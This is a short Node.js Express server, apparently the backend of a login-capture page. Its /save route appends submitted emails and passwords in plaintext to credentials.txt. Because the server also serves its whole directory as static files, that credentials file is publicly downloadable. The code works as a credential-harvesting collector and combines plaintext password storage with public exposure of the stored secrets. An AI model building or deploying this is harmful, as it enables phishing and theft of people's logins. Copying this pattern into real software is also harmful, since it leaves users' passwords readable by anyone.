const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware to parse JSON
app.use(express.json());

// Serve static files from the current directory
app.use(express.static('.'));

// Route to save credentials
app.post('/save', (req, res) => {
  const { email, password } = req.body;
  const timestamp = new Date().toISOString();
  const content = `Email: ${email}\nPassword: ${password}\nSaved: ${timestamp}\n\n`;

  try {
    fs.appendFileSync(path.join(__dirname, 'credentials.txt'), content);
    res.json({ success: true, message: 'Credentials saved successfully' });
  } catch (error) {
    console.error('Error saving credentials:', error);
    res.status(500).json({ success: false, message: 'Failed to save credentials' });
  }
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});